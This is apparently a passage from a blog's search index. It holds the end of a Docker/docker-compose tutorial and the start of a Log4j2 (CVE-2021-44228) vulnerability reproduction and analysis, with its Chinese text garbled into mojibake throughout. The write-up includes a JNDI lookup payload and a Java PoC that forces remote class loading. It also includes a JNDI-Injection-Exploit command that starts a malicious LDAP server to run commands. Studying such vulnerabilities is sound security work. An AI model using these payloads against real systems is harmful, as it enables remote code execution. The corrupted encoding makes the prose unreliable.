ç»“å°¾ï¼Œä»¥é¿å…æ··æ·†ã€‚ (3)å¦‚æœæºè·¯å¾„æ˜¯ä¸ªç›®å½•ï¼Œä¸”ç›®æ ‡è·¯å¾„ä¸å­˜åœ¨ï¼Œåˆ™dockerä¼šè‡ªåŠ¨ä»¥ç›®æ ‡è·¯å¾„åˆ›å»ºä¸€ä¸ªç›®å½•ï¼ŒæŠŠæºè·¯å¾„ç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´è¿›æ¥ã€‚ å¦‚æœç›®æ ‡è·¯å¾„æ˜¯ä¸ªå·²ç»å­˜åœ¨çš„ç›®å½•ï¼Œåˆ™dockerä¼šæŠŠæºè·¯å¾„ç›®å½•ä¸‹çš„æ–‡ä»¶æ‹·è´åˆ°è¯¥ç›®å½•ä¸‹ã€‚ (4)å¦‚æœæºæ–‡ä»¶æ˜¯ä¸ªå½’æ¡£æ–‡ä»¶ï¼ˆå‹ç¼©æ–‡ä»¶ï¼Œæ¯”å¦‚ .taræ–‡ä»¶ï¼‰ï¼Œåˆ™dockerä¼šè‡ªåŠ¨å¸®è§£å‹ã€‚ä½†æ˜¯.tar.gzæ–‡ä»¶æ˜¯ä¸ä¼šè‡ªåŠ¨è§£å‹çš„ã€‚ COPY æ ¼å¼ä¸ºï¼šCOPY src dest å¤åˆ¶æœ¬åœ°ä¸»æœºsrcç›®å½•æˆ–æ–‡ä»¶åˆ°å®¹å™¨çš„destç›®å½•ï¼Œdestä¸å­˜åœ¨æ—¶ä¼šè‡ªåŠ¨åˆ›å»ºã€‚ COPYæŒ‡ä»¤åªèƒ½ä»æ‰§è¡Œdocker buildæ‰€åœ¨çš„ä¸»æœºä¸Šè¯»å–èµ„æºå¹¶å¤åˆ¶åˆ°é•œåƒä¸­ï¼Œè€ŒADDæŒ‡ä»¤è¿˜æ”¯æŒé€šè¿‡URLä»è¿œç¨‹æœåŠ¡å™¨è¯»å–èµ„æºå¹¶å¤åˆ¶åˆ°é•œåƒä¸­ã€‚ COPYæŒ‡ä»¤ä¸ä¼šè‡ªåŠ¨è§£å‹å½’æ¡£æ–‡ä»¶ï¼ˆå‹ç¼©æ–‡ä»¶ï¼‰ã€‚\nENTRYPOINT æ ¼å¼æœ‰ä¸¤ç§ï¼š ENTRYPOINT [\u0026quot;executable\u0026quot;,\u0026quot;param1\u0026quot;,\u0026quot;param2\u0026quot;] ENTRYPOINT command param1,param2 ä¼šåœ¨shellä¸­æ‰§è¡Œã€‚ ç”¨äºé…ç½®å®¹å™¨å¯åŠ¨åæ‰§è¡Œçš„å‘½ä»¤ï¼Œè¿™äº›å‘½ä»¤ä¸èƒ½è¢«docker runæä¾›çš„å‚æ•°è¦†ç›–ã€‚å’ŒCMDä¸€æ ·ï¼Œæ¯ä¸ªDockerfileä¸­åªèƒ½æœ‰ä¸€ä¸ªENTRYPOINTï¼Œå½“æœ‰å¤šä¸ªæ—¶æœ€åä¸€ä¸ªç”Ÿæ•ˆã€‚\nVOLUME æ ¼å¼ä¸º VOLUME [\u0026quot;/data\u0026quot;] ä½œç”¨æ˜¯åˆ›å»ºåœ¨æœ¬åœ°ä¸»æœºæˆ–å…¶ä»–å®¹å™¨å¯ä»¥æŒ‚è½½çš„æ•°æ®å·ï¼Œç”¨æ¥å­˜æ”¾æ•°æ®ã€‚\nUSER æ ¼å¼ä¸ºï¼šUSER username æŒ‡å®šå®¹å™¨è¿è¡Œæ—¶çš„ç”¨æˆ·åæˆ–UIDï¼Œåç»­çš„RUNä¹Ÿä¼šä½¿ç”¨æŒ‡å®šçš„ç”¨æˆ·ã€‚è¦ä¸´æ—¶ä½¿ç”¨ç®¡ç†å‘˜æƒé™å¯ä»¥ä½¿ç”¨sudoã€‚åœ¨USERå‘½ä»¤ä¹‹å‰å¯ä»¥ä½¿ç”¨RUNå‘½ä»¤åˆ›å»ºéœ€è¦çš„ç”¨æˆ·ã€‚ ä¾‹å¦‚ï¼šRUN groupadd -r docker \u0026amp;\u0026amp; useradd -r -g docker docker\nWORKDIR æ ¼å¼ï¼š WORKDIR /path ä¸ºåç»­çš„RUN CMD ENTRYPOINTæŒ‡å®šé…ç½®å·¥ä½œç›®å½•ï¼Œå¯ä»¥ä½¿ç”¨å¤šä¸ªWORKDIRæŒ‡ä»¤ï¼Œè‹¥åç»­æŒ‡ä»¤ç”¨å¾—æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œåˆ™ä¼šåŸºäºä¹‹å‰çš„å‘½ä»¤æŒ‡å®šè·¯å¾„ã€‚\nONBUILD æ ¼å¼ONBUILD [INSTRUCTION] è¯¥é…ç½®æŒ‡å®šå½“æ‰€åˆ›å»ºçš„é•œåƒä½œä¸ºå…¶ä»–æ–°å»ºé•œåƒçš„åŸºç¡€é•œåƒæ—¶æ‰€æ‰§è¡Œçš„æŒ‡ä»¤ã€‚ ä¾‹å¦‚ä¸‹é¢çš„Dockerfileåˆ›å»ºäº†é•œåƒAï¼š ONBUILD ADD . /app ONBUILD RUN python app.py åˆ™åŸºäºé•œåƒAåˆ›å»ºæ–°çš„é•œåƒæ—¶ï¼Œæ–°çš„Dockerfileä¸­ä½¿ç”¨from A æŒ‡å®šåŸºé•œåƒæ—¶ï¼Œä¼šè‡ªåŠ¨æ‰§è¡ŒONBBUILDæŒ‡ä»¤å†…å®¹ï¼Œç­‰ä»·äºåœ¨æ–°çš„è¦æ„å»ºé•œåƒçš„Dockerfileä¸­å¢åŠ äº†ä¸¤æ¡æŒ‡ä»¤ï¼š FROM A ADD ./app RUN python app.py\n0x04 docker-composeå­¦ä¹  ç°åœ¨å¼€æºçš„æ¼æ´é¶åœºvulhubå°±æ˜¯åŸºäºdocker-composeè¿›è¡Œé¶åœºç¼–æ’çš„ã€‚\ndocker-composeç¼–å†™ [todo]\ndocker-composeå‘½ä»¤ æŸ¥çœ‹æŸä¸ªå‘½ä»¤çš„å…·ä½“å¸®åŠ©ï¼šdocker-compose [COMMAND] --help\nå¸¸ç”¨é€‰é¡¹ï¼š --verbose è¾“å‡ºæ›´å¤šè°ƒè¯•ä¿¡æ¯ --version æŸ¥çœ‹ç‰ˆæœ¬ä¿¡æ¯ -f/--file FILE ä½¿ç”¨ç‰¹å®šçš„docker-composeæ¨¡æ¿æ–‡ä»¶ï¼Œé»˜è®¤ä¸ºdocker-compose.yml -p/--project-name NAME æŒ‡å®šé¡¹ç›®åç§°ï¼Œé»˜è®¤ä½¿ç”¨æ­å»ºç›®å½•åç§°\nå¸¸ç”¨å‘½ä»¤ï¼š docker-compose build æ„å»ºæˆ–é‡æ„ä¸€ä¸ªæ–°çš„æœåŠ¡ï¼ŒæœåŠ¡ä¸€æ—¦æ„å»ºåå¸¦ä¸Šä¸€ä¸ªæ ‡è®°åï¼Œå¯ä»¥éšæ—¶åœ¨é¡¹ç›®ç›®å½•ä¸‹è¿è¡Œè¯¥å‘½ä»¤æ¥æ„å»ºæœåŠ¡ docker-compose help è·å–å¸®åŠ© docker-compose kill é€šè¿‡å‘é€SIGKILLä¿¡å·æ¥ä¸­æ­¢å®¹å™¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨-s SIGNæ¥å‘é€æŒ‡å®šå‘½ä»¤ docker-compose logs æŸ¥çœ‹æœåŠ¡çš„è¾“å‡º docker-compose port æ‰“å°ç»‘å®šçš„å…¬å…±ç«¯å£ docker-compose ps åˆ—å‡ºæ‰€æœ‰å®¹å™¨ docker-compose pull [IMAGES] æ‹‰å–ä¸€ä¸ªé•œåƒ docker-compose rm [IMAGES] åˆ é™¤ä¸€ä¸ªé•œåƒ docker-compose run [IMAGES] [COMMAND] å¯åŠ¨ä¸€ä¸ªæœåŠ¡å¹¶æ‰§è¡Œç‰¹å®šå‘½ä»¤ docker-compose scale SERVICE=NUMBER å¯åŠ¨å¤šä¸ªåŒä¸€æœåŠ¡çš„å®¹å™¨ docker-compose stop åœæ­¢æ­£åœ¨è¿è¡Œçš„é¡¹ç›®ï¼ˆå¤šä¸ªå®¹å™¨ï¼‰ï¼Œä½†ä¸åˆ é™¤é¡¹ç›® docker-compose start å¯åŠ¨åœæ­¢è¿è¡Œçš„é¡¹ç›® docker-compose up æ„å»ºã€åˆ›å»ºã€å¯åŠ¨ã€é“¾æ¥ä¸€ä¸ªé¡¹ç›®ç›¸å…³çš„å®¹å™¨ï¼Œå¯ä»¥ä½¿ç”¨-då‚æ•°ä½¿å…¶åœ¨åå°è¿è¡Œï¼Œå¹¶ä¸”é€€å‡ºæ—¶è¯¥é¡¹ç›®æ‰€æœ‰çš„å®¹å™¨éƒ½ä¼šåœæ­¢\n","permalink":"http://www.reus09.top/posts/tech/dockerfile%E7%BC%96%E5%86%99/","summary":"è¿™ç¯‡æ–‡ç« ä¸»è¦æ˜¯æƒ³å¯¹dockerçš„å¸¸è§ä½¿ç”¨åšä¸€ä¸‹å°ç»“ï¼Œå¹¶å­¦ä¹ ä¸€ä¸‹dockerfileçš„ç¼–å†™æ–¹æ³•ã€‚ 0x01 dockerçš„åŸºæœ¬æ¶æ„ é¦–å…ˆæŸ¥çœ‹dockerå®˜","title":"Dockerfileç¼–å†™"},{"content":"0x00 å‰è¨€ æœ€è¿‘æ—¶é—´æ¯”è¾ƒå……æ²›ï¼Œå› æ­¤åœ¨è¿™é‡Œå¤ç°ä¸€äº›æµä¼ æ¯”è¾ƒå¹¿æ³›ã€å±å®³æ€§é«˜çš„æ¼æ´ï¼ŒLog4j2æ¼æ´ä½œä¸º2021å¹´çˆ†å‡ºæ¥çš„CVEæ˜æ˜Ÿï¼Œè‹¦äºå½“æ—¶æ—¶é—´ç´§è¿«ï¼Œæ²¡æœ‰æ—¶é—´è¿›è¡Œå­¦ä¹ ï¼Œç°åœ¨ç³»ç»Ÿæ€§çš„å­¦ä¹ ä¸€ä¸‹log4j2çš„æ¼æ´åŸç†,å¤ç°è¿‡ç¨‹,å…·ä½“ä½¿ç”¨çš„ä¸€äº›å§¿åŠ¿ã€‚\n0x01 æ¼æ´æè¿° Apache Log4j2 æ˜¯ Apache è½¯ä»¶åŸºé‡‘ä¼šä¸‹çš„ä¸€ä¸ªå¼€æºçš„åŸºäº Java çš„æ—¥å¿—è®°å½•å·¥å…·ã€‚Log4j2 æ˜¯ä¸€ä¸ª Log4j 1.x çš„é‡å†™ï¼Œå¹¶ä¸”å¼•å…¥äº†å¤§é‡ä¸°å¯Œçš„ç‰¹æ€§ã€‚è¯¥æ—¥å¿—æ¡†æ¶è¢«å¤§é‡ç”¨äºä¸šåŠ¡ç³»ç»Ÿå¼€å‘ï¼Œç”¨æ¥è®°å½•æ—¥å¿—ä¿¡æ¯ã€‚ç”±äºå…¶ä¼˜å¼‚çš„æ€§èƒ½è€Œè¢«å¹¿æ³›çš„åº”ç”¨äºå„ç§å¸¸è§çš„ Web æœåŠ¡ä¸­ã€‚\n2021 å¹´ 12 æœˆ 9 æ—¥æ™šï¼ŒLog4j2 çš„ä¸€ä¸ªè¿œç¨‹ä»£ç æ‰§è¡Œæ¼æ´çš„åˆ©ç”¨ç»†èŠ‚è¢«å…¬å¼€ã€‚æ”»å‡»è€…ä½¿ç”¨ ${} å…³é”®æ ‡è¯†ç¬¦è§¦å‘ JNDI æ³¨å…¥æ¼æ´ï¼Œå½“ç¨‹åºå°†ç”¨æˆ·è¾“å…¥çš„æ•°æ®è¿›è¡Œæ—¥å¿—è®°å½•æ—¶ï¼Œå³å¯è§¦å‘æ­¤æ¼æ´ï¼ŒæˆåŠŸåˆ©ç”¨æ­¤æ¼æ´å¯ä»¥åœ¨ç›®æ ‡æœåŠ¡å™¨ä¸Šæ‰§è¡Œä»»æ„ä»£ç ã€‚\nç”±äºå…¶è§¦å‘æ–¹å¼ç®€å•ã€ä½¿ç”¨èŒƒå›´å¹¿æ³›ï¼Œå› æ­¤æ¼æ´å±å®³æå¤§ã€‚\nç›®å‰ï¼Œå·²ç»ä¸ºæ­¤æ¼æ´é¢å‘äº† CVE ç¼–å·ï¼š[CVE-2021-44228](https://www.cve.org/CVERecord?id=CVE-2021-44228)ï¼Œæ ¹æ®å®˜æ–¹å®‰å…¨å…¬å‘Šï¼Œä»¥ä¸‹ä¸ºç›¸å…³ä¿¡æ¯ï¼š - æ¼æ´ï¼šLog4j2 çš„ JNDI åŠŸèƒ½ç‚¹æ— æ³•é˜²å¾¡æ¥è‡ªæ”»å‡»è€…çš„ ldap ä»¥åŠå…¶ä»–ç›¸å…³ç«¯ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚ - ä¸¥é‡ç­‰çº§ï¼šCritical - Basic CVSS è¯„åˆ†ï¼š10.0 CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H - å½±å“ç‰ˆæœ¬ï¼šall versions from 2.0-beta9 to 2.14.1 - è¯¦æƒ…æè¿°ï¼šApache Log4j2 \u0026lt;=2.14.1 ç‰ˆæœ¬æä¾›çš„ JNDI ç‰¹æ€§ç”¨äºé…ç½®ã€æ—¥å¿—ä¿¡æ¯ã€å‚æ•°ä½ç½®æ—¶ï¼Œæ— æ³•é˜²æŠ¤æ”»å‡»è€…ä½¿ç”¨ ldap æˆ–å…¶ä»– JNDI ç›¸å…³æ–­ç‚¹çš„æ”»å‡»è¡Œä¸ºã€‚æ”»å‡»è€…å¦‚æœå¯ä»¥æ§åˆ¶æ—¥å¿—ä¿¡æ¯æˆ–æ—¥å¿—ä¿¡æ¯å‚æ•°ï¼Œåˆ™å¯ä»¥åœ¨å¼€å¯äº† lookup substitution åŠŸèƒ½æ—¶åˆ©ç”¨æ¶æ„çš„ ladp æœåŠ¡å™¨æ‰§è¡Œä»»æ„ä»£ç ï¼Œåœ¨ 2.15.0 ç‰ˆæœ¬æ—¶ï¼Œé»˜è®¤å°†å…¶æ­¤è¡Œä¸ºå…³é—­ã€‚ - ç¼“è§£æªæ–½ï¼šåœ¨ \u0026gt;= 2.10 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡è®¾ç½®ç³»ç»Ÿå±æ€§ log4j2.formatMsgNoLookups æˆ–ç¯å¢ƒå˜é‡ LOG4J_FORMAT_MSG_NO_LOOKUPS ä¸º true æ¥ç¼“è§£ã€‚åœ¨ 2.0-beta9 to 2.10.0 ç‰ˆæœ¬ï¼Œå¯ä»¥é€šè¿‡ç§»é™¤ classpath ä¸­çš„ JndiLookup ç±»æ¥ç¼“è§£ï¼Œå‘½ä»¤ä¸ºï¼šzip -q -d log4j-core-*.jar org/apache/logging/log4j/core/lookup/JndiLookup.classã€‚\n0x02 å‰ç½®çŸ¥è¯† JNDIå…¨ç§° Java Naming and Directory Interfaceã€‚\nJNDIæ˜¯Javaå¹³å°çš„ä¸€ä¸ªæ ‡å‡†æ‰©å±•ï¼Œæä¾›äº†ä¸€ç»„æ¥å£ã€ç±»å’Œå…³äºå‘½åç©ºé—´çš„æ¦‚å¿µã€‚å¦‚åŒå…¶å®ƒå¾ˆå¤šJavaæŠ€æœ¯ä¸€æ ·ï¼ŒJDNIæ˜¯provider-basedçš„æŠ€æœ¯ï¼Œæš´éœ²äº†ä¸€ä¸ªAPIå’Œä¸€ä¸ªæœåŠ¡ä¾›åº”æ¥å£ï¼ˆSPIï¼‰ã€‚è¿™æ„å‘³ç€ä»»ä½•åŸºäºåå­—çš„æŠ€æœ¯éƒ½èƒ½é€šè¿‡JNDIè€Œæä¾›æœåŠ¡ï¼Œåªè¦JNDIæ”¯æŒè¿™é¡¹æŠ€æœ¯ã€‚JNDIç›®å‰æ‰€æ”¯æŒçš„æŠ€æœ¯åŒ…æ‹¬LDAPã€CORBA Common Object Serviceï¼ˆCOSï¼‰åå­—æœåŠ¡ã€RMIã€NDSã€DNSã€Windowsæ³¨å†Œè¡¨ç­‰ç­‰ã€‚å¾ˆå¤šJ2EEæŠ€æœ¯ï¼ŒåŒ…æ‹¬EJBéƒ½ä¾é JNDIæ¥ç»„ç»‡å’Œå®šä½å®ä½“ã€‚ JDNIé€šè¿‡ç»‘å®šçš„æ¦‚å¿µå°†å¯¹è±¡å’Œåç§°è”ç³»èµ·æ¥ã€‚åœ¨ä¸€ä¸ªæ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œæ–‡ä»¶åè¢«ç»‘å®šç»™æ–‡ä»¶ã€‚åœ¨DNSä¸­ï¼Œä¸€ä¸ªIPåœ°å€ç»‘å®šä¸€ä¸ªURLã€‚åœ¨ç›®å½•æœåŠ¡ä¸­ï¼Œä¸€ä¸ªå¯¹è±¡åè¢«ç»‘å®šç»™ä¸€ä¸ªå¯¹è±¡å®ä½“ã€‚ JNDIä¸­çš„ä¸€ç»„ç»‘å®šä½œä¸ºä¸Šä¸‹æ–‡æ¥å¼•ç”¨ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡æš´éœ²çš„ä¸€ç»„æ“ä½œæ˜¯ä¸€è‡´çš„ã€‚ä¾‹å¦‚ï¼Œæ¯ä¸ªä¸Šä¸‹æ–‡æä¾›äº†ä¸€ä¸ªæŸ¥æ‰¾æ“ä½œï¼Œè¿”å›æŒ‡å®šåå­—çš„ç›¸åº”å¯¹è±¡ã€‚æ¯ä¸ªä¸Šä¸‹æ–‡éƒ½æä¾›äº†ç»‘å®šå’Œæ’¤é™¤ç»‘å®šåå­—åˆ°æŸä¸ªå¯¹è±¡çš„æ“ä½œã€‚JNDIä½¿ç”¨é€šç”¨çš„æ–¹å¼æ¥æš´éœ²å‘½åç©ºé—´ï¼Œå³ä½¿ç”¨åˆ†å±‚ä¸Šä¸‹æ–‡ä»¥åŠä½¿ç”¨ç›¸åŒå‘½åè¯­æ³•çš„å­ä¸Šä¸‹æ–‡ã€‚ è¯´äººè¯å°±æ˜¯: JDNI æŒ‡å‘çš„æŸä¸ªå¯¹è±¡ï¼Œå³ä¸ºæˆ‘ä»¬çš„æœåŠ¡ ç›®å½•æœåŠ¡æ˜¯ä¸€ä¸ªç‰¹æ®Šçš„æ•°æ®åº“ï¼Œç”¨æ¥ä¿å­˜æè¿°æ€§çš„ã€åŸºäºå±æ€§çš„è¯¦ç»†ä¿¡æ¯ï¼Œæ”¯æŒè¿‡æ»¤åŠŸèƒ½ã€‚\nLDAPï¼ˆLight Directory Access Portocolï¼‰ï¼Œå®ƒæ˜¯åŸºäºX.500æ ‡å‡†çš„è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚\nç›®å½•æ˜¯ä¸€ä¸ªä¸ºæŸ¥è¯¢ã€æµè§ˆå’Œæœç´¢è€Œä¼˜åŒ–çš„æ•°æ®åº“ï¼Œå®ƒæˆæ ‘çŠ¶ç»“æ„ç»„ç»‡æ•°æ®ï¼Œç±»ä¼¼æ–‡ä»¶ç›®å½•ä¸€æ ·ã€‚ ç›®å½•æ•°æ®åº“å’Œå…³ç³»æ•°æ®åº“ä¸åŒï¼Œå®ƒæœ‰ä¼˜å¼‚çš„è¯»æ€§èƒ½ï¼Œä½†å†™æ€§èƒ½å·®ï¼Œå¹¶ä¸”æ²¡æœ‰äº‹åŠ¡å¤„ç†ã€å›æ»šç­‰å¤æ‚åŠŸèƒ½ï¼Œä¸é€‚äºå­˜å‚¨ä¿®æ”¹é¢‘ç¹çš„æ•°æ®ã€‚ æ‰€ä»¥ç›®å½•å¤©ç”Ÿæ˜¯ç”¨æ¥æŸ¥è¯¢çš„ï¼Œå°±å¥½è±¡å®ƒçš„åå­—ä¸€æ ·ã€‚ LDAPç›®å½•æœåŠ¡æ˜¯ç”±ç›®å½•æ•°æ®åº“å’Œä¸€å¥—è®¿é—®åè®®ç»„æˆçš„ç³»ç»Ÿã€‚ 0x03 æ¼æ´å¤ç° è¿™é‡Œå…ˆæ€»ä½“è®²ä¸€ä¸‹log4j2æ¼æ´æ”»å‡»çš„æ•´ä¸ªæµç¨‹ã€‚ Log4j2é»˜è®¤æ”¯æŒè§£ældap/rmiåè®®ï¼ˆåªè¦æ‰“å°çš„æ—¥å¿—ä¸­åŒ…æ‹¬ldap/rmiåè®®å³å¯ï¼‰ï¼Œå¹¶ä¼šé€šè¿‡åç§°ä»ldapæœåŠ¡ç«¯å…¶è·å–å¯¹åº”çš„Classæ–‡ä»¶ï¼Œå¹¶ä½¿ç”¨ClassLoaderåœ¨æœ¬åœ°åŠ è½½LdapæœåŠ¡ç«¯è¿”å›çš„Classç±»ã€‚ è¿™å°±ä¸ºæ”»å‡»è€…æä¾›äº†æ”»å‡»é€”å¾„ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ç•Œé¢ä¼ å…¥ä¸€ä¸ªåŒ…å«æ¶æ„å†…å®¹ï¼ˆä¼šæä¾›ä¸€ä¸ªæ¶æ„çš„Classæ–‡ä»¶ï¼‰çš„ldapåè®®å†…å®¹ï¼ˆå¦‚ï¼šæ¶æ„å†…å®¹${jndi:ldap://localhost:9999/Test}æ¶æ„å†…å®¹ï¼‰ï¼Œè¯¥å†…å®¹ä¼ é€’åˆ°åç«¯è¢«log4j2æ‰“å°å‡ºæ¥ï¼Œå°±ä¼šè§¦å‘æ¶æ„çš„Classçš„åŠ è½½æ‰§è¡Œï¼ˆå¯æ‰§è¡Œä»»æ„åå°æŒ‡ä»¤ï¼‰ï¼Œä»è€Œè¾¾åˆ°æ”»å‡»çš„ç›®çš„ã€‚ log4jç¯å¢ƒæ­å»º æˆ‘ä»¬é‡‡å–mavenè¿›è¡Œæ­å»º\nåœ¨pom.xmlé‡Œé¢å†™å…¥log4j2çš„ç›¸å…³ä¾èµ–\n1 2 3 4 5 6 7 8 9 10 11 12 \u0026lt;dependencies\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-api\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;org.apache.logging.log4j\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;log4j-core\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.14.1\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;/dependencies\u0026gt; ç„¶åç»™å‡ºç¤ºä¾‹ä»£ç \n1 2 3 4 5 6 7 8 9 10 11 12 13 import org.apache.logging.log4j.LogManager; import org.apache.logging.log4j.Logger; public class main { private static final Logger logger = LogManager.getLogger(main.class); public static void main(String[] args) { // java ç‰ˆæœ¬è¿‡æœ¬ï¼Œç»™å®šçš„å‡ ä¸ªjavaç‰ˆæœ¬é»˜è®¤è®¾ç½®trustURLCodebaseä¸ºFalse System.setProperty(\u0026#34;com.sun.jndi.ldap.object.trustURLCodebase\u0026#34;,\u0026#34;true\u0026#34;); logger.error(\u0026#34;${jndi:ldap://127.0.0.1:1389/#exploit}\u0026#34;); } } ç„¶åå€Ÿç”¨welk1nå¸ˆå‚…æä¾›çš„JDNIæ³¨å…¥é›†æˆå·¥å…·å¯åŠ¨æ¶æ„æœåŠ¡å™¨ï¼Œç”¨æ¥ç»™ ldap/rmi è°ƒç”¨è¿”å›æ¶æ„ä»£ç \njava -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -C \u0026quot;open /System/Applications/Calculator.app\u0026quot; -A \u0026quot;127.0.0.1\u0026quot;:\nå°†ç”Ÿæˆçš„å¯åˆ©ç”¨çš„æ¶æ„æœåŠ¡å™¨ldapçš„åœ°å€:ldap://127.0.0.1:1389/up14yk\nä½¿ç”¨logger.error()æ¥è§¦å‘æ¼æ´\nå¯ä»¥çœ‹åˆ°æ¼æ´å¤ç°å®Œæ¯•ï¼Œåˆ©ç”¨æ–¹æ³•æ˜¯å¾ˆç®€å•çš„ï¼Œåªéœ€è¦log4j2ç‰ˆæœ¬æ»¡è¶³è¦æ±‚ï¼Œä¸€æ—¦åœ¨logå­—ç¬¦ä¸²ä¸­æ£€æµ‹åˆ°${}ï¼Œå°±ä¼šè§£æå…¶ä¸­çš„å­—ç¬¦ä¸²å°è¯•ä½¿ç”¨lookupæŸ¥è¯¢ï¼Œå› æ­¤åªè¦èƒ½æ§åˆ¶logå‚æ•°å†…å®¹ï¼Œå°±æœ‰æœºä¼šå®ç°æ¼æ´åˆ©ç”¨ã€‚\n0x04 æ¼æ´åŸç†åˆ†æ è¿™é‡Œä¸»è¦å‚è€ƒsu18å¤§ä½¬çš„å…³äºlog4j2æ¼æ´çš„åˆ†æã€‚ä¸»è¦å¯¹äºLog4j2å…³äºLookupåŠŸèƒ½çš„ä½¿ç”¨ä»¥åŠæ¼æ´çš„è§¦å‘å‡ ä¸ªå…³é”®ç‚¹è¿›è¡Œé˜è¿°ã€‚\né¦–å…ˆæŸ¥çœ‹æ¼æ´è§¦å‘å‡½æ•°æ ˆçš„è°ƒç”¨æƒ…å†µï¼Œæˆ‘ä»¬åœ¨æœ€åæ‰§è¡Œjndiè¿œç¨‹å‘½ä»¤æ‰§è¡Œçš„åœ°æ–¹æ‰“ä¸‹æ–­ç‚¹ã€‚\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 lookup:172, JndiManager (org.apache.logging.log4j.core.net) lookup:56, JndiLookup (org.apache.logging.log4j.core.lookup) lookup:221, Interpolator (org.apache.logging.log4j.core.lookup) resolveVariable:1110, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:1033, StrSubstitutor (org.apache.logging.log4j.core.lookup) substitute:912, StrSubstitutor (org.apache.logging.log4j.core.lookup) replace:467, StrSubstitutor (org.apache.logging.log4j.core.lookup) format:132, MessagePatternConverter (org.apache.logging.log4j.core.pattern) format:38, PatternFormatter (org.apache.logging.log4j.core.pattern) toSerializable:344, PatternLayout$PatternSerializer (org.apache.logging.log4j.core.layout) toText:244, PatternLayout (org.apache.logging.log4j.core.layout) encode:229, PatternLayout (org.apache.logging.log4j.core.layout) encode:59, PatternLayout (org.apache.logging.log4j.core.layout) directEncodeEvent:197, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryAppend:190, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) append:181, AbstractOutputStreamAppender (org.apache.logging.log4j.core.appender) tryCallAppender:156, AppenderControl (org.apache.logging.log4j.core.config) callAppender0:129, AppenderControl (org.apache.logging.log4j.core.config) callAppenderPreventRecursion:120, AppenderControl (org.apache.logging.log4j.core.config) callAppender:84, AppenderControl (org.apache.logging.log4j.core.config) callAppenders:540, LoggerConfig (org.apache.logging.log4j.core.config) processLogEvent:498, LoggerConfig (org.apache.logging.log4j.core.config) log:481, LoggerConfig (org.apache.logging.log4j.core.config) log:456, LoggerConfig (org.apache.logging.log4j.core.config) log:63, DefaultReliabilityStrategy (org.apache.logging.log4j.core.config) log:161, Logger (org.apache.logging.log4j.core) tryLogMessage:2205, AbstractLogger (org.apache.logging.log4j.spi) logMessageTrackRecursion:2159, AbstractLogger (org.apache.logging.log4j.spi) logMessageSafely:2142, AbstractLogger (org.apache.logging.log4j.spi) logMessage:2017, AbstractLogger (org.apache.logging.log4j.spi) logIfEnabled:1983, AbstractLogger (org.apache.logging.log4j.spi) error:740, AbstractLogger (org.apache.logging.log4j.spi) main:18, main æ—¥å¿—è®°å½•/è§¦å‘ç‚¹ æ ¹æ®å‡½æ•°æ ˆï¼Œè¿™é‡Œæ˜¯æ ¹æ®loggerç­‰çº§è°ƒç”¨å¯¹åº”çš„æ–¹æ³•\næˆ‘ä»¬é€šè¿‡LogManager.getLogger()æ¥è·å–ä¸€ä¸ªLoggerå¯¹è±¡ï¼Œç„¶åè°ƒç”¨å…¶debug/info/error/warn/fatal/trace/log ç­‰æ–¹æ³•è®°å½•æ—¥å¿—ç­‰ä¿¡æ¯ã€‚è¿™äº›æ–¹æ³•ï¼Œéƒ½ä¼šé¦–å…ˆä½¿ç”¨org.apache.logging.log4j.spi.AbstractLogger#logIfEnabledçš„è‹¥å¹²ä¸ªé‡è½½æ–¹æ³•æ¥æ ¹æ®å½“å‰é…ç½®è®°å½•æ—¥å¿—ç­‰çº§ï¼Œåˆ¤æ–­æ˜¯å¦éœ€è¦è¾“å‡ºconsoleå’Œè®°å½•æ—¥å¿—æ–‡ä»¶ã€‚\nåœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œä¼šè¾“å‡º WARN/ERROR/FATAL ç­‰çº§çš„æ—¥å¿—ã€‚å¯ä»¥ä½¿ç”¨é…ç½®æ–‡ä»¶æ›´æ”¹æ—¥å¿—è¾“å‡ºç­‰çº§ï¼š\n1 2 3 4 5 6 \u0026lt;?xml version=\u0026#34;1.0\u0026#34; encoding=\u0026#34;UTF-8\u0026#34;?\u0026gt; \u0026lt;Configuration\u0026gt; \u0026lt;Loggers\u0026gt; \u0026lt;Logger name=\u0026#34;org.su18\u0026#34; level=\u0026#34;All\u0026#34;/\u0026gt; \u0026lt;/Loggers\u0026gt; \u0026lt;/Configuration\u0026gt; ä¹Ÿå¯ä»¥ä½¿ç”¨å¦‚ä¸‹ä»£ç æ¥é…ç½®è¾“å‡ºç­‰çº§ï¼š\n1 2 3 4 5 LoggerContext ctx = (LoggerContext) LogManager.getContext(false); Configuration config = ctx.getConfiguration(); LoggerConfig loggerConfig = config.getLoggerConfig(LogManager.ROOT_LOGGER_NAME); loggerConfig.setLevel(Level.ALL); ctx.updateLoggers(); æœ¬æ­¤æ¼æ´çš„è§¦å‘ç‚¹ï¼Œå®é™…ä¸Šæ˜¯ä» AbstractLogger#logMessage æ–¹æ³•å¼€å§‹çš„ï¼Œå‡¡æ˜¯è°ƒç”¨äº†æ­¤æ–¹æ³•çš„ info/error/warn 